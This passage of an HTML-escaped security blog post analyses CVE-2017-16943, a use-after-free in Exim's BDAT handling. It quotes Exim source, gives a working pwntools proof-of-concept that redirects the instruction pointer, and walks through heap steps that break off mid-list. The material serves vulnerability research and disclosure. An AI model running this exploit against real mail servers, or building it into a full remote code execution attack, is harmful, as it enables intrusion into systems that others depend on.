highlighter-rouge&quot;&gt;current_block&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt; cuts store inside it for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;newtext&lt;/code&gt;, then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_release(next-&amp;gt;text)&lt;/code&gt; frees &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt;, which is equal to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt;, and leaves &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;newtext&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt; pointing to a freed memory area. Any further usage of these pointers leads to a use-after-free vulnerability. To trigger this bug, we need to make exim call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt; after &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt; is allocated. This was impossible until BDAT command was introduced into exim. BDAT makes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt; reachable and finally leads to an RCE.
Exim uses &lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/globals.h#L136&quot;&gt;function pointers&lt;/a&gt; to switch between different input sources, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;receive_getc&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;receive_getbuf&lt;/code&gt;. When receiving BDAT data, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;receive_getc&lt;/code&gt; is set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bdat_getc&lt;/code&gt; in order to check left chunking data size and to handle following command of BDAT. In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;receive_msg&lt;/code&gt;, exim also uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;receive_getc&lt;/code&gt;. It loops to read data, and stores data into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt;, extends if insufficient.
&lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/receive.c#L1789&quot;&gt;receive.c: 1817 receive_msg&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(;;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;receive_getc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GETC_BUFFER_UNLIMITED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  
  &lt;span class=&quot;cm&quot;&gt;/* If we hit EOF on a SMTP connection, it&apos;s an error, since incoming
  SMTP must have a correct &quot;.&quot; terminator. */&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EOF&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;smtp_input&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* &amp;amp;&amp;amp; !smtp_batched_input */&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;smtp_reply&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handle_lost_connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;US&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; (header)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;smtp_yield&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TIDYUP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                       &lt;span class=&quot;cm&quot;&gt;/* Skip to end of function */&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bdat_getc&lt;/code&gt;, once the SIZE is reached, it tries to read the next BDAT command and raises error message if the following command is incorrect. 
&lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/smtp_in.c#L628&quot;&gt;smtp_in.c: 628 bdat_getc&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BDAT_CMD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sscanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;smtp_cmd_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;%u %n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chunking_datasize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;synprot_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L_smtp_protocol_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;501&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;US&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;missing size for BDAT command&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ERR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;In exim, it usually calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;synprot_error&lt;/code&gt; to raise error message, which also logs at the same time.
&lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/smtp_in.c#L2984&quot;&gt;smtp_in.c: 628 bdat_getc&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;synprot_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errmess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;yield&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;log_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LOG_MAIN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;SMTP %s error in &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; %s %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;L_smtp_syntax_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;syntax&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;protocol&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;string_printing&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;smtp_cmd_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host_and_ident&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TRUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errmess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The log messages are printed by string_printing. This function ensures a string is printable. For this reason, it extends the string to transfer characters if any unprintable character exists, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos;\n&apos;-&amp;gt;&apos;\\n&apos;&lt;/code&gt;. Therefore, it asks &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt; for memory to store strings.
This store makes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;if (!store_extend(next-&amp;gt;text, oldsize, header_size))&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;receive_msg&lt;/code&gt; failed when next extension occurs and then triggers use-after-free.&lt;/p&gt;

&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;
&lt;p&gt;The following is the Proof-of-Concept(PoC) python script of this vulnerability. This PoC controls the control flow of SMTP server and sets instruction pointer to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt;. For fuzzing issue, we did change the runtime configuration of exim. As a result, this PoC works only when &lt;strong&gt;dkim&lt;/strong&gt; is enabled. We use it as an example because the situation is less complicated. The version with default configuration is also exploitable, and we will discuss it at the end of this section.&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# CVE-2017-16943 PoC by meh at DEVCORE
# pip install pwntools
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;127.0.0.1&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;EHLO test&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;250 HELP&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;MAIL FROM:&amp;lt;meh@some.domain&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;RCPT TO:&amp;lt;meh@some.domain&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;a&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1250&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x7f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;command&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;BDAT 1&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;:BDAT &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x7f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;a&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xdeadbeef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1e00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;command&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ol&gt;
  &lt;li&gt;Running out of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt;
 In order to achieve code execution, we need to make the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt; get the first store of a block. That is, running out of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt; and making &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt; allocate a new block. Therefore, we send a long message &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos;a&apos;*0x1250+&apos;\x7f&apos;&lt;/code&gt; with an unprintable character to cut &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt;, making &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yield_length&lt;/code&gt; less than 0x100.
 &lt;img src=&quot;/assets/img/blog/20171211/2.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;Starts BDAT data transfer
 After that, we send BDAT command to start data transfer. At the beginning, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt; are allocated by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt;. 
 &lt;img src=&quot;/assets/img/blog/20171211/3.png&quot; alt=&quot;&quot; /&gt;
 The function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dkim_exim_verify_init&lt;/code&gt; is called sequentially and it also calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt;. Notice that this function uses &lt;strong&gt;ANOTHER &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_pool&lt;/code&gt;&lt;/strong&gt;, so it allocates from heap without changing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt; which &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt; also points to.
 &lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/receive.c#L1734&quot;&gt;receive.c: 1734 receive_msg&lt;/a&gt;
    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;smtp_input&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;smtp_batched_input&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dkim_disable_verify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;n&quot;&gt;dkim_exim_verify_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chunking_state&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CHUNKING_OFFERED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_getc&lt;/code&gt; inside &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bdat_getc&lt;/code&gt;
 Then, we send a BDAT command without SIZE. Exim complains about the incorrect command and cuts the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;string_printing&lt;/code&gt;. 
 &lt;img src=&quot;/assets/img/blog/20171211/4.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;Keep sending msg until extension and bug triggered
 In this way, while we keep sending huge messages, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt; gets freed after the extension. In the malloc.c of glibc (so called ptmalloc2), system manages a linked list of freed memory chunks, which is called unsorted bin. Freed chunks are put into unsorted bin if it is not the last chunk on the heap. In step 2, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dkim_exim_verify_init&lt;/code&gt; allocated chunks after &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt;. Therefore, this chunk is put into unsorted bin and the pointers of linked list are stored into the first 16 bytes of chunk (on x86-64). The location written is exactly &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block-&amp;gt;next&lt;/code&gt;, and therefore &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block-&amp;gt;next&lt;/code&gt; is overwritten to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unsorted bin&lt;/code&gt; inside &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_arena&lt;/code&gt; of libc (linked list pointer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fd&lt;/code&gt; points back to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unsorted bin&lt;/code&gt; if no other freed chunk exists). 
 &lt;img src=&quot;/assets/img/blog/20171211/5.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;Keep sending msg for the next extension
 When the next extension occurs, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt; tries to cut from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_arena&lt;/code&gt;, which makes attackers able to overwrite all global variables below main_arena.&lt;/li&gt;
  &lt;li&gt;Overwrite global variables in libc&lt;/li&gt;
  &lt;li&gt;Finish sending message and trigger &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;free()&lt;/code&gt;
